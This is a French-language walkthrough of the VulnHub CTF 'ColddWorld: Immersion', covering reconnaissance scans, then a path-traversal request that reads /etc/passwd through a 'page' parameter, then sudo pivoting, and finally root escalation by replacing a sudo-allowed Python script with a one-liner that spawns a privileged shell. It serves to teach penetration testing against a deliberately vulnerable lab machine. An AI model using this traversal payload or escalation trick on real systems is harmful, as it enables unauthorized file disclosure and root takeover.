# Solution du CTF ColddWorld: Immersion de VulnHub

[ColddWorld: Immersion](https://vulnhub.com/entry/colddworld-immersion,668/) est un CTF proposé sur la plateforme VulnHub et créé par *Martin Frias* (Aka. *C0ldd*)

```
Nmap scan report for 192.168.56.108
Host is up (0.000098s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Immersion
|_http-server-header: Apache/2.4.18 (Ubuntu)
3042/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c7439b1ec2a8276bc2bc58a94d6d4e14 (RSA)
|   256 6099c287ea6a1475e1b46f934f9bfd89 (ECDSA)
|_  256 7fb24af2ecdba58745922f132e5e74bd (ED25519
```

On a donc un serveur web et un SSH sur un port non standard.

## Oreilles de lapin

Le site web ne donnant rien d'intéressant on passe direct sur `Feroxbuster` pour une énumération :

```shellsession
$ feroxbuster -u http://192.168.56.108/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.108/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      317c http://192.168.56.108/secure
301        9l       28w      313c http://192.168.56.108/wp
301        9l       28w      313c http://192.168.56.108/js
301        9l       28w      314c http://192.168.56.108/css
301        9l       28w      316c http://192.168.56.108/login
403        9l       28w      279c http://192.168.56.108/server-status
200       17l       27w      401c http://192.168.56.108/
[####################] - 17s    62260/62260   0s      found:7       errors:0      
[####################] - 17s    62260/62260   3661/s  http://192.168.56.108/
```

Dans la page de login on trouve en commentaire HTML le message suivant :

> Hi Carls,
> 
> if you read this, I have gone on a trip, let me tell you, after the last attack we received (thanks to your inactivity as a web developer) we had to make password changes,
> 
> but since he doesn't use a mobile phone or home computers (a bit weird since you are a web developer),
> 
> I left clues on the "page" for you to find your password, I know it will be easy because you are good for detecting security flaws (or so I thought before the attack :D),
> 
> I leave your password in a file called carls.txt that is inside /var, when you get it, log in and finish your work by preparing my bash.
> 
> Greetings, c0ldd.

Assez étonnant, on doit visiblement trouver une faille qui permettra l'accès à un fichier présent dans le dossier `/var` de la machine.

L'autre point à éclaircir c'est la présence de soit disant indices dans la "page", comme ils disent entre guillemets...

`page` est un nom de variable connu pour être potentiellement vulnérable à des directory traversal.

Je rassemble la liste des URLs trouvées jusqu'à présent et j'y rajoute un paramètre `page`. Je met le tout dans un fichier `pages.txt` :

```
http://192.168.56.108/?page=hackme
http://192.168.56.108/login/?page=hackme
http://192.168.56.108/login/account.php?page=hackme
http://192.168.56.108/wp/?page=hackme
http://192.168.56.108/secure/?page=hackme
```

Puis je le fait charger par `Wapiti` via l'option `-s` :

```shellsession
$ wapiti -u http://192.168.56.108/ -s pages.txt --color -m file --flush-session
ujson module not found, using json

 ██╗    ██╗ █████╗ ██████╗ ██╗████████╗██╗██████╗
 ██║    ██║██╔══██╗██╔══██╗██║╚══██╔══╝██║╚════██╗
 ██║ █╗ ██║███████║██████╔╝██║   ██║   ██║ █████╔╝
 ██║███╗██║██╔══██║██╔═══╝ ██║   ██║   ██║ ╚═══██╗
 ╚███╔███╔╝██║  ██║██║     ██║   ██║   ██║██████╔╝
  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   ╚═╝╚═════╝  
Wapiti 3.1.6 (wapiti-scanner.github.io)
[*] Saving scan state, please wait...

[*] Launching module file
---
Linux local file disclosure vulnerability in http://192.168.56.108/login/account.php via injection in the parameter page
Evil request:
    GET /login/account.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
    host: 192.168.56.108
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
---

[*] Generating report...
A report has been generated in the file /home/devloop/.wapiti/generated_report
Open /home/devloop/.wapiti/generated_report/192.168.56.108_02172023_1501.html with a browser to see this report.
```

Effectivement la page `account.php` (qui est la cible du formulaire de login) est bien vulnérable.

Je note la présence de ces deux utilisateurs dans le `/etc/passwd` :

```
c0ldd:x:1000:1000:c0ldd,,,:/home/c0ldd:/bin/bash
carls:x:1001:1001:,,,:/home/carls:/bin/bash
```

Et on peut accéder au fichier qui contient le mot de passe :

```
carls:Y2FybG9z
```

Le mot de passe est en base64 et se décode en `carlos`.

## So c0ldd streams

```shellsession
carls@Immersion:/home$ sudo -l
[sudo] password for carls: 
Coincidiendo entradas por defecto para carls en Immersion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario carls puede ejecutar los siguientes comandos en Immersion:
    (c0ldd : c0ldd) /bin/bash
```

Comme indiqué dans le message on peut *regarder* le bash de `c0ldd`.

```shellsession
carls@Immersion:/home$ sudo -u c0ldd /bin/bash
c0ldd@Immersion:/home$ id
uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd)
c0ldd@Immersion:~$ cd ~c0ldd/
c0ldd@Immersion:/home/c0ldd$ ls -al
total 40
drwxr-x--- 4 c0ldd c0ldd 4096 mar 17  2021 .
drwxr-xr-x 4 root  root  4096 mar 17  2021 ..
-rw------- 1 c0ldd c0ldd    6 mar 17  2021 .bash_history
-rw-r--r-- 1 c0ldd c0ldd  220 mar 17  2021 .bash_logout
-rw-r--r-- 1 c0ldd c0ldd 3771 mar 17  2021 .bashrc
drwx------ 2 c0ldd c0ldd 4096 mar 17  2021 .cache
-rw-r--r-- 1 root  root    33 mar 17  2021 DoNotRun.py
drwxrwxr-x 2 c0ldd c0ldd 4096 mar 17  2021 .nano
-rw-r--r-- 1 c0ldd c0ldd  655 mar 17  2021 .profile
-rw-r--r-- 1 c0ldd c0ldd    0 mar 17  2021 .sudo_as_admin_successful
-rw-rw-r-- 1 c0ldd c0ldd   25 mar 17  2021 user.txt
c0ldd@Immersion:/home/c0ldd$ cat user.txt 
TXV5IGJpZW4gaGVjaG8gOik=
c0ldd@Immersion:/home/c0ldd$ sudo -l
Coincidiendo entradas por defecto para c0ldd en Immersion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en Immersion:
    (root) NOPASSWD: /usr/bin/python3 /home/c0ldd/DoNotRun.py
```

Cet utilisateur peut exécuter un script Python avec les droits de root... mais le fichier appartient à root et on ne dispose pas de droits pour le modifier... pourtant :

```shellsession
c0ldd@Immersion:/home/c0ldd$ echo test > DoNotRun.py
bash: DoNotRun.py: Permiso denegado
c0ldd@Immersion:/home/c0ldd$ rm DoNotRun.py
rm: ¿borrar el fichero regular 'DoNotRun.py'  protegido contra escritura? (s/n) y
c0ldd@Immersion:/home/c0ldd$ ls
startup.py  user.txt
```

Je me suis entretenu avec `ChatGPT` qui était bien à l'ouest pour expliquer ce qu'il se passait, pour lui c'était objectivement impossible.

Si on fouille un peu il semble que ce soit une histoire d'inode, peut être même relatif au système de fichier utilisé (?).

Mais pour résumer dans ces situations on peut supprimer ou renomer, voire déplacer le fichier un sous-dossier sans qu'il change d'owner. Voici deux pages traitant du sujet :

[linux - How to delete a file owned by different user using a bash script? - Super User](https://superuser.com/questions/1497782/how-to-delete-a-file-owned-by-different-user-using-a-bash-script)

[linux - Why was I able to delete a file owned by root in my home directory without being root? - Server Fault](https://serverfault.com/questions/726907/why-was-i-able-to-delete-a-file-owned-by-root-in-my-home-directory-without-being)

Du coup il ne reste plus qu'à créer le script Python que l'on souhaite :

```shellsession
c0ldd@Immersion:/home/c0ldd$ echo 'import os;os.system("/bin/bash -p")' > DoNotRun.py 
c0ldd@Immersion:/home/c0ldd$ sudo /usr/bin/python3 /home/c0ldd/DoNotRun.py
root@Immersion:/home/c0ldd# id
uid=0(root) gid=0(root) grupos=0(root)
root@Immersion:/home/c0ldd# cd /root
root@Immersion:/root# ls
root.txt
root@Immersion:/root# cat root.txt
RmVsaWNpZGFkZXMgY3JhY2s=
```

*Publié le 17 février 2023*
